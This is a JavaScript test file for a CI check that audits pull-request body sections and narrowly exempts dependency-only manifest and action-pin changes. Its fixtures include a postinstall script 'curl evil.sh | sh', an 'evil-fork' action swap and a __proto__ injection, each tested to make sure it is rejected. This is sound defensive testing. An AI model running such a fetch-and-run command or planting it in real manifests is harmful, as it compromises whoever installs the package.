/**
 * check-docs-disposition.test.js — Unit tests for the PR-body section format
 * check (scripts/check-docs-disposition.js) that gates CI. Every PR carries a
 * "## Docs disposition" section (one line per governing doc, plus one per
 * judgment-only clause) and a "## Change record"; these tests prove the red
 * paths fire (missing/unexpected/duplicate/malformed lines, missing sections
 * and markers), that the shipped PR template's HTML comments are inert in both
 * directions, and that the declared dependency-only exemption is exactly as
 * narrow as documented (the manifests' dependency-resolution fields and
 * same-action pin bumps only).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { execFileSync, spawnSync } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import {
  changedLines,
  isPinOnlyWorkflowDiff,
  isDependencyOnlyPackageJsonDiff,
  isDependencyOnlyCargoTomlDiff,
  PACKAGE_JSON_DEPENDENCY_FIELDS,
  isExemptDiff,
  docsInScope,
  expectedDispositionLines,
  parseDispositionSection,
  stripHtmlComments,
  extractSection,
  auditBody,
} from '../../../../scripts/check-docs-disposition.js';

const MAP = {
  description: 'test map',
  'repo-wide': { description: 'x', docs: ['README.md', 'docs/hub.md'] },
  areas: {
    alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md', 'docs/hub.md'] },
    tooling: { code: ['scripts/**'], docs: ['docs/tooling.md'] },
  },
  unassigned: [],
  'declared-governance': [],
};

const REGISTRY = {
  description: 'test registry',
  prefixes: { AL: 'docs/alpha.md' },
  retired: { AL: [] },
  clauses: [
    { doc: 'docs/alpha.md', clause: 'AL-1', tag: 'judgment-only', justification: 'x' },
    { doc: 'docs/alpha.md', clause: 'AL-2', tag: 'check-exists', 'check-ref': 'scripts/x.js' },
    { doc: 'docs/alpha.md', clause: 'AL-3', tag: 'judgment-only', justification: 'y' },
  ],
};

const noContent = () => null;

const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);

/** Minimal unified diff: context lines prefixed ' ', changes '+'/'-'. */
const diff = (lines) => ['--- a/f', '+++ b/f', '@@ -1 +1 @@', ...lines].join('\n');

/**
 * Full-file unified diff between two package.json texts, as a delete-all /
 * add-all hunk — a valid unified diff that, like the caller's full-context
 * `git diff -U<huge>`, carries both complete sides.
 */
const jdiffText = (beforeText, afterText) =>
  [
    '--- a/package.json',
    '+++ b/package.json',
    '@@ -1 +1 @@',
    ...beforeText.split('\n').map((l) => `-${l}`),
    ...afterText.split('\n').map((l) => `+${l}`),
  ].join('\n');

/** Full-file unified diff between two package.json objects. */
const jdiff = (before, after) =>
  jdiffText(JSON.stringify(before, null, 2), JSON.stringify(after, null, 2));

/** A realistic manifest touching every boundary the exemption must hold. */
const BASE_PKG = {
  name: 'fixture',
  version: '1.0.0',
  private: true,
  engines: { node: '>=24' },
  keywords: ['fixture'],
  scripts: { build: 'x' },
  overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2' },
  devDependencies: { 'left-pad': '^1.0.0' },
};

/** BASE_PKG with top-level fields replaced (shallow). */
const pkgWith = (patch) => ({ ...structuredClone(BASE_PKG), ...patch });

describe('changedLines', () => {
  it('keeps content that begins with + or - at column 0, drops only file headers', () => {
    const text = diff(['+- a yaml list item', '-removed', ' context']);
    assert.deepEqual(changedLines(text), ['- a yaml list item', 'removed']);
  });
});

describe('isPinOnlyWorkflowDiff — the pin-bump exemption has teeth', () => {
  it('accepts a same-action SHA bump', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: actions/checkout@${SHA_B} # v7`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), true);
  });

  it('rejects an action identity swap even when both lines are pin-shaped', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: evil-fork/checkout@${SHA_B} # v6`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), false);
  });

  it('rejects short pins, non-pin lines, and rider content starting with -', () => {
    assert.equal(
      isPinOnlyWorkflowDiff(
        diff([`-      - uses: a/b@${'a'.repeat(7)}`, `+      - uses: a/b@${'b'.repeat(7)}`]),
      ),
      false,
    );
    assert.equal(isPinOnlyWorkflowDiff(diff([`+        run: npm run lint`])), false);
    const rider = diff([
      `-      - uses: actions/checkout@${SHA_A}`,
      `+      - uses: actions/checkout@${SHA_B}`,
      '+- a column-zero rider line',
    ]);
    assert.equal(isPinOnlyWorkflowDiff(rider), false);
  });

  it('rejects an empty diff', () => {
    assert.equal(isPinOnlyWorkflowDiff(diff([' unchanged'])), false);
  });
});

describe('isDependencyOnlyPackageJsonDiff — structural and field-aware', () => {
  it('accepts a version bump inside a dependency block', () => {
    const text = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('regression_402_nested_override_entries_are_exempt', () => {
    // Regression: PR #402 (scoped minimatch overrides) added NESTED override
    // objects and fell out of the exemption — the then line-based check only
    // accepted flat "name": "range" entries inside a dependency block, so a
    // dependency-resolution-only diff owed the full disposition sections.
    // https://github.com/Arsarneq/docent/pull/402
    // The fixture mirrors that PR's exact package.json hunk shape, context
    // lines included.
    const text = [
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1 +1 @@',
      ' {',
      '   "name": "fixture",',
      '   "scripts": {',
      '     "build": "x"',
      '   },',
      '   "overrides": {',
      '+    "@npmcli/config": {',
      '+      "minimatch": "^10.0.3"',
      '+    },',
      '     "js-yaml": "^4.2.0",',
      '-    "qs": "^6.15.2"',
      '+    "qs": "^6.15.2",',
      '+    "unified-engine": {',
      '+      "minimatch": "^10.0.3"',
      '+    }',
      '   },',
      '   "devDependencies": {',
      '     "left-pad": "^1.0.0"',
      '   }',
      ' }',
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('accepts nested override entries added, removed, or renamed', () => {
    const nested = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', 'unified-engine': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, nested)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, BASE_PKG)), true);
    const renamed = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', '@npmcli/config': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, renamed)), true);
  });

  it('accepts a whole dependency-resolution field added or removed', () => {
    const noOverrides = structuredClone(BASE_PKG);
    delete noOverrides.overrides;
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(noOverrides, BASE_PKG)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, noOverrides)), true);
  });

  it('rejects a change outside the dependency-resolution fields — npm scripts are real changes', () => {
    const text = jdiff(BASE_PKG, pkgWith({ scripts: { build: 'echo skipped' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('rejects a diff touching both a dependency field AND another field', () => {
    const both = pkgWith({
      devDependencies: { 'left-pad': '^1.3.0' },
      scripts: { build: 'x', postinstall: 'curl evil.sh | sh' },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, both)), false);
  });

  it('rejects engines, packageManager, and version changes — toolchain and release contracts, not resolution data', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ engines: { node: '>=26' } }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ packageManager: 'npm@11.0.0' }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ version: '1.0.1' }))),
      false,
    );
  });

  it('rejects array-field changes, including an array/object shape change', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: ['fixture', 'x'] }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: { fixture: true } }))),
      false,
    );
  });

  it('accepts key reordering and formatting-only diffs — the parsed manifest is identical', () => {
    // Reorder: same fields, different insertion order (JSON.stringify keeps it).
    const reordered = {
      version: BASE_PKG.version,
      name: BASE_PKG.name,
      scripts: BASE_PKG.scripts,
      engines: BASE_PKG.engines,
      keywords: BASE_PKG.keywords,
      private: BASE_PKG.private,
      devDependencies: BASE_PKG.devDependencies,
      overrides: BASE_PKG.overrides,
    };
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, reordered)), true);
    // Whitespace only: 2-space vs 4-space indentation.
    const wsOnly = jdiffText(JSON.stringify(BASE_PKG, null, 2), JSON.stringify(BASE_PKG, null, 4));
    assert.equal(isDependencyOnlyPackageJsonDiff(wsOnly), true);
  });

  it('tolerates the no-newline-at-end-of-file marker', () => {
    const text =
      jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })) +
      '\n\\ No newline at end of file';
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a partial-context fragment — even with the block opener visible (why the caller supplies full context)', () => {
    // Neither fragment parses as JSON, so neither can prove the change stays
    // inside dependency-resolution fields; both are non-exempt.
    const withOpener = diff([
      '   "devDependencies": {',
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
      '   }',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(withOpener), false);
    const openerDropped = diff([
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(openerDropped), false);
  });

  it('fails closed on non-object JSON and on an empty diff', () => {
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText('[1]', '[1, 2]')), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(diff([' unchanged'])), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(''), false);
  });

  it('regression: a "__proto__" member added or removed never rides the exemption', () => {
    // A plain a[f] read on the side missing the member resolves "__proto__"
    // through the prototype chain to Object.prototype, which deep-equals {} —
    // so the {} value is the case that would slip without own-property reads
    // ({"x": 1} walls either way).
    const before = JSON.stringify(BASE_PKG, null, 2);
    const inject = (value) =>
      before.replace('"name": "fixture",', `"name": "fixture",\n  "__proto__": ${value},`);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{}'))), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), before)), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{ "x": 1 }'))), false);
    // Present and identical on both sides: inert, a dep bump stays exempt.
    const bumped = JSON.stringify(
      pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }),
      null,
      2,
    ).replace('"name": "fixture",', '"name": "fixture",\n  "__proto__": {},');
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), bumped)), true);
  });

  it('accepts CRLF manifest content — the carriage returns are inter-token whitespace', () => {
    const crlf = (obj) => JSON.stringify(obj, null, 2).replace(/\n/g, '\r\n');
    const text = jdiffText(
      crlf(BASE_PKG),
      crlf(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a byte-order mark — the side does not parse', () => {
    const bom = (obj) => '\uFEFF' + JSON.stringify(obj, null, 2);
    const text = jdiffText(
      bom(BASE_PKG),
      bom(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('fails closed on a file-creation diff — the empty before side does not parse', () => {
    const created = [
      '--- /dev/null',
      '+++ b/package.json',
      '@@ -0,0 +1 @@',
      ...JSON.stringify(BASE_PKG, null, 2)
        .split('\n')
        .map((l) => `+${l}`),
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(created), false);
  });
});

describe('PACKAGE_JSON_DEPENDENCY_FIELDS — welded to its declared doctrine home', () => {
  it('every exempt field is named in CONTRIBUTING.md’s exemption paragraph', () => {
    // The boundary is declared in two homes — this exported list (the code the
    // gate runs) and the exemption paragraph in CONTRIBUTING's "Docs
    // Disposition and Change Record" section (the doctrine contributors read).
    // Weld them so they cannot drift apart silently — scoped to that
    // paragraph's extent, so a field dropped from the declaration cannot stay
    // green off the same token elsewhere in the file (e.g. `dependencies` in
    // setup prose).
    const contributing = readFileSync(
      path.resolve(import.meta.dirname, '../../../../.github/CONTRIBUTING.md'),
      'utf8',
    );
    const anchor = 'Dependency-only PRs skip both sections';
    const start = contributing.indexOf(anchor);
    assert.notEqual(start, -1, `CONTRIBUTING.md must carry the "${anchor}" exemption paragraph`);
    const rest = contributing.slice(start);
    const end = rest.indexOf('\n\n');
    const paragraph = end === -1 ? rest : rest.slice(0, end);
    for (const field of PACKAGE_JSON_DEPENDENCY_FIELDS) {
      assert.match(
        paragraph,
        new RegExp('`' + field + '`'),
        `CONTRIBUTING.md's exemption paragraph must name \`${field}\``,
      );
    }
  });
});

describe('isDependencyOnlyCargoTomlDiff', () => {
  it('accepts a bump inside [dependencies] and rejects one outside', () => {
    const inside = diff([' [dependencies]', '-serde = "1.0.0"', '+serde = "1.0.1"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(inside), true);
    const outside = diff([' [package]', '-version = "1.0.0"', '+version = "2.0.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(outside), false);
  });

  it('needs the section header in the hunk — a false negative without it (same fix as package.json)', () => {
    const withHeader = diff([
      ' [dependencies]',
      ' serde = "1.0.0"',
      '-tokio = "1.0.0"',
      '+tokio = "1.1.0"',
    ]);
    assert.equal(isDependencyOnlyCargoTomlDiff(withHeader), true);
    const headerDropped = diff([' serde = "1.0.0"', '-tokio = "1.0.0"', '+tokio = "1.1.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(headerDropped), false);
  });
});

describe('isExemptDiff — the declared dependency-only exemption', () => {
  const depBump = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
  const pinBump = diff([
    `-      - uses: actions/checkout@${SHA_A}`,
    `+      - uses: actions/checkout@${SHA_B}`,
  ]);

  it('exempts a pure-lockfile diff on its own', () => {
    assert.equal(isExemptDiff({ files: ['package-lock.json'], fileDiff: () => 'anything' }), true);
  });

  it('exempts lockfiles, dependency-field manifest bumps, and pin bumps together', () => {
    const diffs = {
      'package-lock.json': 'anything',
      'packages/extension/package.json': depBump,
      '.github/workflows/test.yml': pinBump,
      'packages/desktop/src-tauri/Cargo.lock': 'anything',
    };
    assert.equal(isExemptDiff({ files: Object.keys(diffs), fileDiff: (f) => diffs[f] }), true);
  });

  it('does not exempt a manifest whose diff leaves the dependency-resolution fields', () => {
    const scripts = jdiff(
      BASE_PKG,
      pkgWith({ scripts: { build: 'x', postinstall: 'curl evil.sh | sh' } }),
    );
    assert.equal(isExemptDiff({ files: ['package.json'], fileDiff: () => scripts }), false);
  });

  it('does not exempt mixed diffs or empty file lists', () => {
    assert.equal(
      isExemptDiff({
        files: ['package-lock.json', 'packages/alpha/index.js'],
        fileDiff: () => depBump,
      }),
      false,
    );
    assert.equal(isExemptDiff({ files: [], fileDiff: () => '' }), false);
  });
});

describe('run() manifest exemption — full-file context so the block opener is never dropped', () => {
  // Regression: the disposition gate demanded sections for a pure dependabot
  // devDependency bump because git's default 3-line context drops the
  // "devDependencies": {" opener when the changed entry sits more than a few lines
  // below it, so isDependencyOnlyPackageJsonDiff misjudged it as a change outside a
  // dependency block. Dependabot cannot add the demanded sections.
  // Surfaced by https://github.com/Arsarneq/docent/pull/268
  const SCRIPT = path.resolve(import.meta.dirname, '../../../../scripts/check-docs-disposition.js');

  /**
   * A package.json whose bumped devDependency sits many lines below the block
   * opener — deep enough that any realistic reduction of the diff context (not
   * just the default 3) would drop the opener and reintroduce the bug.
   */
  const pkg = (ver) => {
    const devDependencies = {};
    for (let i = 0; i < 24; i++) devDependencies[`filler-${String(i).padStart(2, '0')}`] = '^1.0.0';
    devDependencies['markdownlint-cli2'] = ver;
    devDependencies['z-last'] = '^1.0.0';
    return (
      JSON.stringify(
        {
          name: 'fixture',
          version: '1.0.0',
          private: true,
          scripts: { build: 'x' },
          devDependencies,
        },
        null,
        2,
      ) + '\n'
    );
  };

  /**
   * Commit `beforeText` as package.json in a throwaway git repo, commit
   * `afterText` over it, and run the check CLI against that one-file diff with
   * an empty PR body (exempt diffs must pass with no disposition sections).
   * @returns {{ status: number | null, stdout: string, stderr: string }}
   */
  const runCheckOnManifestChange = (beforeText, afterText) => {
    const tmp = mkdtempSync(path.join(os.tmpdir(), 'ddisp-'));
    try {
      const g = (args) => execFileSync('git', args, { cwd: tmp, encoding: 'utf8' });
      g(['init', '-q', '-b', 'main']);
      g(['config', 'user.email', 't@example.com']);
      g(['config', 'user.name', 'Test']);
      writeFileSync(path.join(tmp, 'package.json'), beforeText);
      g(['add', '.']);
      g(['commit', '-qm', 'base']);
      const base = g(['rev-parse', 'HEAD']).trim();
      writeFileSync(path.join(tmp, 'package.json'), afterText);
      g(['add', '.']);
      g(['commit', '-qm', 'change']);
      return spawnSync('node', [SCRIPT, base], {
        cwd: tmp,
        env: { ...process.env, PR_BODY: '' },
        encoding: 'utf8',
      });
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  };

  it('regression_268_dep_bump_far_below_block_opener_is_exempt', () => {
    const r = runCheckOnManifestChange(pkg('^0.22.1'), pkg('^0.23.0'));
    assert.equal(
      r.status,
      0,
      `expected the dependency bump to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });

  it('regression_402_nested_override_diff_is_exempt_end_to_end', () => {
    // Regression: PR #402 scoped two minimatch overrides to their dependents —
    // nested override objects, pure dependency-resolution data — and the gate
    // demanded the full disposition sections anyway (the then line-based
    // exemption accepted only flat "name": "range" entries inside a block).
    // https://github.com/Arsarneq/docent/pull/402
    const manifest = (overrides) =>
      JSON.stringify(
        { name: 'fixture', version: '1.0.0', private: true, scripts: { build: 'x' }, overrides },
        null,
        2,
      ) + '\n';
    const r = runCheckOnManifestChange(
      manifest({ 'js-yaml': '^4.2.0', qs: '^6.15.2' }),
      manifest({
        '@npmcli/config': { minimatch: '^10.0.3' },
        'js-yaml': '^4.2.0',
        qs: '^6.15.2',
        'unified-engine': { minimatch: '^10.0.3' },
      }),
    );
    assert.equal(
      r.status,
      0,
      `expected the nested-override diff to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });
});

describe('docsInScope', () => {
  it('collects the resolved areas doc sets for changed code', () => {
    assert.deepEqual(
      docsInScope({ files: ['packages/alpha/x.js'], map: MAP, readFile: noContent }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('includes an edited repo-wide doc that belongs to no doc set', () => {
    assert.deepEqual(docsInScope({ files: ['README.md'], map: MAP, readFile: noContent }), [
      'README.md',
    ]);
  });

  it('routes a repo-wide doc that sits in a doc set through its areas (no self-duplication)', () => {
    assert.deepEqual(docsInScope({ files: ['docs/hub.md'], map: MAP, readFile: noContent }), [
      'docs/alpha.md',
      'docs/hub.md',
    ]);
  });

  it('resolves via a pointer comment when file content names a governing doc', () => {
    assert.deepEqual(
      docsInScope({ files: ['tools/free.rs'], map: MAP, readFile: () => '// see docs/alpha.md' }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('a declared-governance file resolves to its governed-by, overriding its area docs', () => {
    // scripts/gen.js is code-owned by tooling (→ docs/tooling.md) but declared governed by docs/alpha.md.
    const map = {
      ...MAP,
      'declared-governance': [
        { path: 'scripts/gen.js', reason: 'x', 'governed-by': ['docs/alpha.md'] },
      ],
    };
    assert.deepEqual(docsInScope({ files: ['scripts/gen.js'], map, readFile: noContent }), [
      'docs/alpha.md',
    ]);
  });

  it('a declared-governance file with governed-by [] contributes no docs', () => {
    const map = {
      ...MAP,
      'declared-governance': [{ path: 'scripts/data.json', reason: 'x', 'governed-by': [] }],
    };
    assert.deepEqual(docsInScope({ files: ['scripts/data.json'], map, readFile: noContent }), []);
  });
});

describe('expectedDispositionLines', () => {
  it('emits one doc-level line plus one per judgment-only clause', () => {
    assert.deepEqual(
      expectedDispositionLines({ docs: ['docs/alpha.md', 'docs/tooling.md'], registry: REGISTRY }),
      [
        { doc: 'docs/alpha.md', clause: null },
        { doc: 'docs/alpha.md', clause: 'AL-1' },
        { doc: 'docs/alpha.md', clause: 'AL-3' },
        { doc: 'docs/tooling.md', clause: null },
      ],
    );
  });
});

describe('stripHtmlComments', () => {
  it('removes single-line, multi-line, and unterminated comments', () => {
    const text = 'keep\n<!-- gone -->\n<!-- multi\nline\ngone -->\nkeep2\n<!-- open forever\ngone';
    assert.equal(stripHtmlComments(text), 'keep\n\n\nkeep2\n');
  });
});

describe('parseDispositionSection', () => {
  it('parses verbs, docs, clause anchors, and text — markdown prefixes tolerated', () => {
    const { lines, malformed } = parseDispositionSection(
      [
        'unaffected: docs/alpha.md — nothing here changes capture',
        '- updated: docs/tooling.md — documented the new check',
        '1. unaffected: docs/alpha.md §AL-1 — comment-only change',
        '> unaffected: docs/alpha.md §AL-3 — quoted but real',
        '**updated:** docs/hub.md — bold verb normalized',
        'unaffected: `docs/beta.md` — backticks stripped',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.equal(malformed.length, 0);
    assert.deepEqual(
      lines.map((l) => [l.verb, l.doc, l.clause]),
      [
        ['unaffected', 'docs/alpha.md', null],
        ['updated', 'docs/tooling.md', null],
        ['unaffected', 'docs/alpha.md', 'AL-1'],
        ['unaffected', 'docs/alpha.md', 'AL-3'],
        ['updated', 'docs/hub.md', null],
        ['unaffected', 'docs/beta.md', null],
      ],
    );
  });

  it('collects lines that try to be dispositions but do not parse', () => {
    const { lines, malformed } = parseDispositionSection('updated docs/alpha.md missing colon\n');
    assert.deepEqual(lines, []);
    assert.deepEqual(malformed, ['updated docs/alpha.md missing colon']);
  });
});

describe('extractSection', () => {
  const body = '# T\n\n## Docs disposition\n\nline1\n\n## Change record\n\nIntent: x\n';

  it('extracts a section up to the next heading, case-insensitively', () => {
    assert.match(extractSection(body, 'Docs disposition'), /line1/);
    assert.doesNotMatch(extractSection(body, 'docs disposition'), /Intent:/);
    assert.match(extractSection(body, 'Change record'), /Intent: x/);
  });

  it('returns null for an absent section', () => {
    assert.equal(extractSection(body, 'Motivation'), null);
  });
});

describe('auditBody', () => {
  const expected = [
    { doc: 'docs/alpha.md', clause: null },
    { doc: 'docs/alpha.md', clause: 'AL-1' },
  ];
  const goodBody = [
    '## Docs disposition',
    '',
    'unaffected: docs/alpha.md — no capture change',
    'unaffected: docs/alpha.md §AL-1 — comment-only',
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
  ].join('\n');

  it('passes a complete body — also with CRLF line endings', () => {
    assert.deepEqual(Object.values(auditBody({ body: goodBody, expected })).flat(), []);
    const crlf = goodBody.replace(/\n/g, '\r\n');
    assert.deepEqual(Object.values(auditBody({ body: crlf, expected })).flat(), []);
  });

  it('reports a missing expected line by its exact anchor', () => {
    const r = auditBody({
      body: goodBody.replace(/unaffected: docs\/alpha\.md §AL-1.*\n/, ''),
      expected,
    });
    assert.deepEqual(r.missing, ['docs/alpha.md §AL-1']);
  });

  it('reports out-of-scope and duplicate lines', () => {
    const noisy = goodBody.replace(
      '## Change record',
      'updated: docs/other.md — not in scope\nunaffected: docs/alpha.md — again\n\n## Change record',
    );
    const r = auditBody({ body: noisy, expected });
    assert.deepEqual(r.unexpected, ['docs/other.md']);
    assert.deepEqual(r.duplicates, ['docs/alpha.md']);
  });

  it('reports both sections when the body has neither', () => {
    const r = auditBody({ body: 'just a description', expected });
    assert.deepEqual(r.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
  });

  it('reports missing change-record markers', () => {
    const r = auditBody({
      body: goodBody.replace('Outside knowledge: none.\n', '').replace(/mutation:.*\n?/, ''),
      expected,
    });
    assert.deepEqual(r.changeRecordProblems, [
      'change record has no "Outside knowledge:" line',
      'change record has no "mutation:" line',
    ]);
  });

  it('ignores disposition lines and markers hidden inside HTML comments — both directions', () => {
    // A clause line present only inside a comment must NOT count as present…
    const hidden = goodBody.replace(
      'unaffected: docs/alpha.md §AL-1 — comment-only',
      '<!-- unaffected: docs/alpha.md §AL-1 — invisible in the rendered PR -->',
    );
    assert.deepEqual(auditBody({ body: hidden, expected }).missing, ['docs/alpha.md §AL-1']);

    // …and markers that exist only in the template's comment must not satisfy.
    const emptyRecord = goodBody.replace(
      /Intent: test\.[\s\S]*$/,
      '<!-- Intent: <one sentence>\n Outside knowledge: <or "none">\n mutation: say so. -->\n',
    );
    const r = auditBody({ body: emptyRecord, expected });
    assert.equal(r.changeRecordProblems.length, 3);
  });

  it('requires markers at a line start — a marker quoted mid-prose does not satisfy', () => {
    const midProse = goodBody.replace(
      'Intent: test.',
      'This paragraph mentions the word Intent: casually.',
    );
    const r = auditBody({ body: midProse, expected });
    assert.deepEqual(r.changeRecordProblems, ['change record has no "Intent:" line']);
  });

  it('rejects the shipped PR template as-is (comments are inert, sections are empty)', () => {
    const template = readFileSync(
      path.resolve(import.meta.dirname, '../../../../.github/PULL_REQUEST_TEMPLATE.md'),
      'utf8',
    );
    const r = auditBody({ body: template, expected });
    assert.deepEqual(r.unexpected, []); // nothing inside comments leaks in
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
    assert.equal(r.changeRecordProblems.length, 3);
  });
});
